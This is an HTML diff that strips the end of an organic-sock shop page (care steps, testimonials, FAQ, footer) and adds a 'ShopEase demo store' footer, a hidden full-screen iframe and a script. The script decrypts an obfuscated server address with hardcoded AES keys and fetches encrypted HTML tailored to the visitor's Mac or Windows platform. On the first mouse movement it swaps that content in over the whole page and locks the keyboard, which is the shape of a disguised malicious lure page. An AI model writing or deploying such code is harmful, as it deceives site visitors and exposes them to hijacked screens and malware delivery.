-                    <div class="care-step-badge">02</div>
-                    <h3>Cold Water Rinse (30°C)</h3>
-                    <p>Washing in cold water prevents the natural cotton cellulose fibers from contracting and preserves the elasticity of inner Lycra wrapping cores.</p>
-                </div>
-                <div class="care-card">
-                    <div class="care-step-badge">03</div>
-                    <h3>Gentle Plant Detergent</h3>
-                    <p>Avoid harsh chemical chlorine bleaches and fabric softeners, which coat cotton pores with synthetic silicones and reduce moisture absorbency.</p>
-                </div>
-                <div class="care-card">
-                    <div class="care-step-badge">04</div>
-                    <h3>Flat Natural Air Dry</h3>
-                    <p>Air drying on a clothesline preserves the resilience of elastane bands and prevents thermal embrittlement common in high-heat commercial tumble dryers.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 10: PATRON & RUNNER TESTIMONIALS -->
-    <section class="testimonials-section section-padding">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">Patron Perspectives</span>
-                <h2 class="section-title">Trusted By Runners, Architects & Everyday Explorers</h2>
-                <p class="section-subtitle">Feedback from customers who have replaced their entire sock drawer with CottonKnitPod organic socks.</p>
-            </div>
-            <div class="testimonials-grid">
-                <div class="testimonial-card">
-                    <div class="testi-quote">“The hand-linked toe seam is a total game changer. I walk over twelve thousand steps a day on construction sites and in client meetings, and I have never experienced a single blister or toe hot spot since switching.”</div>
-                    <div class="testi-author">
-                        <strong>Julian Montgomery</strong>
-                        <span>New York • Principal Architect</span>
-                    </div>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testi-quote">“As a marathon runner, finding natural cotton socks that stay up, don't bunch in the arch, and wick moisture effectively seemed impossible until I tried the 168-needle crew pod. They are simply unmatched.”</div>
-                    <div class="testi-author">
-                        <strong>Sarah Jenkins</strong>
-                        <span>Boulder, CO • Ultra Marathoner</span>
-                    </div>
-                </div>
-                <div class="testimonial-card">
-                    <div class="testi-quote">“The texture and density of the combed cotton are immediately noticeable. Even after twenty washes in cold water, they retain their shape and plushness without getting stiff or pilling.”</div>
-                    <div class="testi-author">
-                        <strong>David Sterling</strong>
-                        <span>Seattle • Industrial Designer</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 11: INTERACTIVE KNITTING FAQ ACCORDION -->
-    <section class="faq-section section-padding bg-creme">
-        <div class="section-container">
-            <div class="section-header-center">
-                <span class="section-eyebrow">Inquiries & Answers</span>
-                <h2 class="section-title">Frequently Asked Questions</h2>
-                <p class="section-subtitle">Everything you need to know about our organic cotton sourcing, gauge selection, sizing, and shipping.</p>
-            </div>
-            <div class="faq-accordion-container">
-                <div class="faq-item">
-                    <button class="faq-trigger">
-                        <span>Why is hand-linked seamless toe closure superior to machine seam closing?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Standard automated sock machines close the toe with an overlock seam that creates a raised, rigid ridge across the top of the toes. When pressed against the shoe toe box, this ridge causes friction, skin irritation, and painful blisters. Hand-linking connects each stitch loop individually with a fine thread, resulting in a 100% flat and invisible transition that feels seamless against the skin.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <button class="faq-trigger">
-                        <span>What is the difference between 168-needle and 200-needle circular knitting?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>The needle count refers to the number of needles around the circular knitting cylinder. A 200-needle machine creates a dense, ultra-fine gauge fabric with smaller stitch loops, making it ideal for dress shoes and sleek trainers. A 168-needle machine uses slightly thicker yarn counts to create a balanced, durable rib knit suited for everyday sneakers and casual wear.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <button class="faq-trigger">
-                        <span>Where do you source your organic cotton and dyes?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Our raw cotton is grown on certified organic farms in the Aegean and San Joaquin valleys, adhering to strict Global Organic Textile Standard (GOTS) guidelines. Our yarns are dyed in closed-loop dyehouses using non-toxic botanical and low-impact pigments that conserve water and contain zero heavy metals.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <button class="faq-trigger">
-                        <span>How do I select the right sock size for my footwear?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>We offer three graduated sizes: Small (US Men 4-7 / Women 5-8), Medium (US Men 7.5-10.5 / Women 8.5-11.5), and Large (US Men 11-14 / Women 12+). Because we use high-recovery core-spun Lycra within the organic cotton yarns, our socks provide an adaptive anatomical fit that flexes with your foot shape.</p>
-                    </div>
-                </div>
-                <div class="faq-item">
-                    <button class="faq-trigger">
-                        <span>Do your socks contain any synthetic plastic microfibers?</span>
-                        <span class="faq-icon">+</span>
-                    </button>
-                    <div class="faq-answer">
-                        <p>Our main fabric body is crafted from 85% to 100% pure organic cotton and fine merino wool. To provide necessary stretch recovery and heel durability, we use a minimal core of recycled polyamide and core-spun elastane that is completely wrapped inside the cotton yarn, ensuring only natural fibers touch your skin.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- SECTION 12: CALL TO ACTION ATELIER BANNER -->
-    <section class="cta-banner-section bg-noir text-ivory">
-        <div class="section-container">
-            <div class="cta-banner-card">
-                <span class="section-eyebrow text-accent">Direct From The Loom</span>
-                <h2 class="cta-title">Elevate Your Daily Step With CottonKnitPod</h2>
-                <p class="cta-desc">
-                    Experience the unprecedented comfort of GOTS certified organic combed cotton, seamless hand-linked toes, and anatomical arch engineering.
-                </p>
-                <div class="cta-btn-wrap">
-                    <a href="contact.html" class="btn-primary-terracotta">Request Mill Dispatch Consultation</a>
-                    <a href="about.html" class="btn-secondary-outline">Learn About Our Machines</a>
-                </div>
-            </div>
-        </div>
-    </section>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
 
-    <!-- Global Footer -->
-    <footer class="site-footer">
-        <div class="footer-top">
-            <div class="footer-column brand-col">
-                <div class="footer-logo">
-                    <span class="logo-title">COTTON KNIT POD</span>
-                </div>
-                <p class="footer-desc">
-                    Artisanal sockmakers dedicated to 100% GOTS organic combed cotton, seamless hand-linked toe linking, anatomical Y-heel engineering, and breathable double-cylinder knitting.
-                </p>
-                <div class="footer-atelier-badges">
-                    <span class="badge-item">Zero Synthetic Microplastics</span>
-                    <span class="badge-item">Hand-Linked Seamless Toes</span>
-                    <span class="badge-item">100% GOTS Organic Cotton</span>
-                </div>
-            </div>
-            <div class="footer-column">
-                <h4 class="footer-heading">Mill Navigation</h4>
-                <ul class="footer-nav">
-                    <li><a href="index.html">Mill Homepage</a></li>
-                    <li><a href="about.html">Knitting Heritage & Circular Looms</a></li>
-                    <li><a href="blog.html">Knitwear Science Monographs</a></li>
-                    <li><a href="contact.html">Custom Orders & Concierge</a></li>
-                </ul>
-            </div>
-            <div class="footer-column">
-                <h4 class="footer-heading">Policies & Standards</h4>
-                <ul class="footer-nav">
-                    <li><a href="privacy.html">Privacy Governance Charter</a></li>
-                    <li><a href="terms.html">Terms of Supply & Craftsmanship</a></li>
-                    <li><a href="disclaimer.html">Podiatric & Care Disclaimer</a></li>
-                    <li><a href="cookies.html">Cookie Configuration & Settings</a></li>
-                </ul>
-            </div>
-            <div class="footer-column contact-col">
-                <h4 class="footer-heading">Mill Coordinates</h4>
-                <p class="contact-line"><strong>Atelier Desk:</strong> 520 Broadway, Suite 400, New York, NY 10012, United States</p>
-                <p class="contact-line"><strong>Dispatch Phone:</strong> +1-800-582-9648</p>
-                <p class="contact-line"><strong>Direct Email:</strong> concierge@cottonknitpod.com</p>
-                <p class="contact-line"><strong>Hours:</strong> Mon - Fri: 9:00 AM - 6:00 PM EST (Knitwear Atelier)</p>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <div class="footer-bottom-content">
-                <p class="copyright">&copy; <?php echo date('Y'); ?> CottonKnitPod Artisanal Mill. All global rights reserved. Master crafted with zero shortcuts.</p>
-                <div class="footer-bottom-links">
-                    <a href="privacy.html">Privacy</a>
-                    <a href="terms.html">Terms</a>
-                    <a href="disclaimer.html">Disclaimer</a>
-                    <a href="cookies.html">Cookies</a>
-                </div>
-            </div>
-        </div>
-    </footer>
-    <script src="script.js"></script>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+ZV4B4shIyEYopUetzDlM8rBCY07decV0ugFl6IZehLUPZK3pNzYk+";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
